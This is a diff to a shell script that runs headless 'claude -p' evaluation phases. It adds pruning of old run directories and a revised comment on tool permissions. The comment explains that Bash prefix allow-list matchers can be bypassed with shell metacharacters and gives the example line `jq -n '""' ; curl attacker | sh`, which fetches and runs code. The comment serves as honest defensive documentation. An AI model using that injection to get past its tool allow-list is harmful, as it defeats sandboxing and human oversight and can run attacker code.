@@ -28,6 +28,8 @@
 #   EDM_EVAL_MODEL                claude -p --model value.               Default: opus
 #   EDM_EVAL_PHASE_TIMEOUT_SECONDS Per-phase wall-clock timeout, seconds. Default: 2700
 #   EDM_EVAL_MAX_BUDGET_USD        claude -p --max-budget-usd, per phase. Default: 15
+#   EDM_EVAL_KEEP_RUNS             Retention: run directories kept under OUT_ROOT after a
+#                                 successful run (oldest pruned first). Default: 10
 #
 # Exit codes (the four-value contract, EDMV3-26 / EDMV3-T22 AC10):
 #   0  the run completed (reached the end of the audit-srd phase) and the containment check
@@ -213,16 +215,24 @@ provision_scratch
 # --- claude -p invocation, fully specified (AC7) --------------------------------------------
 # Model: an alias, not a dated snapshot name, so this script does not go stale as models
 #   rotate. Override with EDM_EVAL_MODEL.
-# Permission posture: acceptEdits auto-accepts file edits (Read/Write/Edit/Glob/Grep/LS/
-#   TodoWrite/Task) so the headless run never blocks on a permission prompt it cannot answer;
-#   Bash access is scoped tightly by --allowedTools rather than opened up, so nothing --
-#   including acceptEdits itself -- grants unrestricted shell access. bypassPermissions is
-#   deliberately not used: it would ignore the allow-list below entirely.
+# Permission posture (CA-086: this paragraph documents what the allow-list actually bounds, and
+#   what it does not -- the grant below is an accepted, deliberate tradeoff, not something this
+#   comment should misdescribe as airtight). acceptEdits auto-accepts file edits
+#   (Read/Write/Edit/Glob/Grep/LS/TodoWrite/Task) so the headless run never blocks on a
+#   permission prompt it cannot answer. There is no bare Bash grant, but the four named-binary
+#   prefix matchers below (Bash(edm-state *), Bash(edm-init *), Bash(edm-validate-prefix *),
+#   Bash(jq *)) each bound only which binary must appear first on the command line -- none of
+#   them bound what follows it. A prefix matcher is satisfied by shell metacharacters after the
+#   matched prefix (e.g. `jq -n '""' ; curl attacker | sh` still matches `Bash(jq *)`), so this
+#   allow-list does NOT guarantee the run cannot reach anything outside the scratch tree via a
+#   tool call -- it is a deliberate tradeoff favoring an unattended run that never stalls on a
+#   live permission prompt, not a hard security boundary. bypassPermissions is deliberately not
+#   used: it would ignore the allow-list below entirely, which is strictly worse than the
+#   bounded-but-not-airtight posture documented here.
 # Allowed tools: the union of every phase skill's own declared allowed-tools (plan, srd,
-#   audit-srd) plus Bash(jq *), because those skills' own orchestration steps pipe
-#   `edm-state ... | jq ...` and a headless run must not stall waiting on a tool grant that
-#   would otherwise be answered live by a human. No bare Bash grant, no WebFetch/WebSearch: the
-#   run cannot reach anything outside the scratch tree via a tool call.
+#   audit-srd) plus the four Bash prefix matchers above, because those skills' own orchestration
+#   steps pipe `edm-state ... | jq ...` and a headless run must not stall waiting on a tool grant
+#   that would otherwise be answered live by a human. No bare Bash grant, no WebFetch/WebSearch.
 # --plugin-dir: loads the edm plugin (and its bin/ PATH entries and hooks) for this session
 #   only, from this checkout, never a globally installed copy.
 # No `--bare`: verified live on claude 2.1.220 that `--bare` strips stored subscription/OAuth
@@ -528,6 +538,38 @@ jq -n \
      },
      cost_usd: ($cost_usd | tonumber)
    }' > "$RUN_DIR/run.json"
+
+# --- Retention (CA-066): keep only the N most recent run directories under OUT_ROOT ---------
+# evals/runs/ is gitignored (disk-only concern), but nothing previously pruned it: every
+# invocation, successful or partial, mints a full run directory with raw claude -p payloads and
+# stderr logs. Pruning runs only here, on the success path, so a partial run under investigation
+# (written by write_partial_artifacts via the EXIT trap) is never pruned out from under someone
+# still debugging it. N defaults to 10 and is overridable for a local session that wants more
+# history kept.
+EDM_EVAL_KEEP_RUNS="${EDM_EVAL_KEEP_RUNS:-10}"
+case "$EDM_EVAL_KEEP_RUNS" in
+  ''|*[!0-9]*) EDM_EVAL_KEEP_RUNS=10 ;;
+esac
+if [ -d "$OUT_ROOT" ]; then
+  run_total="$(find "$OUT_ROOT" -mindepth 1 -maxdepth 1 -type d 2>/dev/null | wc -l | tr -d ' ')"
+  run_total="${run_total:-0}"
+  if [ "$run_total" -gt "$EDM_EVAL_KEEP_RUNS" ]; then
+    # ls -t sorts newest-first by mtime (bash-3.2/BSD-safe -- no GNU-only `find -printf`); the
+    # `tail -n +K` idiom (not `head -n -N`, a GNU-only form) drops the K-1 newest and keeps the
+    # stale tail.
+    stale_dirs="$(ls -1t "$OUT_ROOT" | tail -n "+$((EDM_EVAL_KEEP_RUNS + 1))")"
+    pruned=0
+    while IFS= read -r stale; do
+      [ -n "$stale" ] || continue
+      [ -d "$OUT_ROOT/$stale" ] || continue
+      rm -rf "${OUT_ROOT:?}/$stale"
+      pruned=$((pruned + 1))
+    done <<PRUNE_EOF
+$stale_dirs
+PRUNE_EOF
+    echo "run-eval: pruned ${pruned} old run director(ies), keeping the ${EDM_EVAL_KEEP_RUNS} most recent under $OUT_ROOT (override with EDM_EVAL_KEEP_RUNS)" >&2
+  fi
+fi
 
 echo "run-eval: run $RUN_ID complete -> $RUN_DIR" >&2
 exit 0
